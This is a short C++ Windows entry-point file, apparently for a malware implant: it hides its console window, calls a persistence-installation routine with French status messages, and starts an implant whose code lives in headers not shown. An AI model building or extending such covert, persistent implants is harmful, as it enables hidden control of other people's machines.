#include "beacon.h"
#include "persistence.h"
#include <iostream>
#include <windows.h>

int main() {
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);

    if (install_persistence()) {
        std::cout << "Persistance installee avec succes." << std::endl;
    }
    else {
        std::cout << "Echec de l'installation de la persistance." << std::endl;
    }

    start_implant();
    return 0;
}